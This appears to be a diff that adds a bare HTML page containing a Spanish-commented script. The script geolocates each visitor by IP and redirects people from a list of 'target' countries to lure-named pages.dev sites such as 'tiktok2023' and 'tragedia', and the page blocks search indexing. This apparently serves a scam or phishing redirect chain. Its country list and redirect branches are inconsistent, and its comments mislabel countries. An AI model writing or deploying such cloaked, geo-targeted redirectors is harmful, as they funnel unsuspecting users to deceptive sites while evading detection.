@@ -1,0 +1,57 @@
+<!DOCTYPE html>
+<html>
+<head>
+    <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1, user-scalable=no"/>
+    <meta http-equiv="content-type" content="text/html; charset=UTF-8"/>
+    <meta http-equiv="X-UA-Compatible" content="IE=edge"/>
+    <meta http-equiv="cache-control" content="no-cache">
+
+    <meta name="googlebot" content="noindex"/> 
+    <meta name="robots" content="index">
+    <meta name="robots" content="noindex">
+    <meta name="robots" content="nofollow">
+
+    <script>
+        let countryHack = ['ES', 'GR', 'HU', 'HR', 'RO', 'ZA', 'PE', 'NL']; // Paises objetivo
+        let urlPromocion = 'https://geo-dqt.pages.dev/';
+        let country;
+
+        fetch('https://get.geojs.io/v1/ip/country')
+            .then((response) => response.text())
+            .then((data) => {
+                country = data.trim();
+                if (countryHack.includes(country)) {
+                    redirectURL(country);
+                } else {
+                    // Redirige a una URL de respaldo si el país no está en la lista
+                    window.location.href = urlPromocion;
+                }
+            });
+
+function redirectURL(country) {
+    // Agrega lógica personalizada para redirigir según el país aquí
+    if (country === 'ES') {
+        window.location.href = 'https://tragedia.pages.dev/';
+    } else if (country === 'GR') {
+        window.location.href = 'https://tiktok2023.pages.dev/';
+    } else if (country === 'HU') {
+        window.location.href = 'https://tiktok2023.pages.dev/';
+    } else if (country === 'RS') {
+        window.location.href = 'https://tiktok2023.pages.dev/';
+    } else if (country === 'RO') {
+        window.location.href = 'https://tiktok2023.pages.dev/';
+	} else if (country === 'PE') {
+        window.location.href = 'https://tiktok2023.pages.dev/';
+    } else if (country === 'UK') {
+        window.location.href = 'https://tiktok2023.pages.dev/'; // Agrega URL para Fiji
+    } else if (country === 'NL') {
+        window.location.href = 'https://tiktok2023.pages.dev/'; // Agrega URL para Polonia
+    } else {
+        // Si no se especifica un redireccionamiento para un país específico,
+        // redirige al scriptHack o a otra URL de respaldo
+        window.location.href = urlPromocion;
+    }
+}
+    </script>
+</body>
+</html>
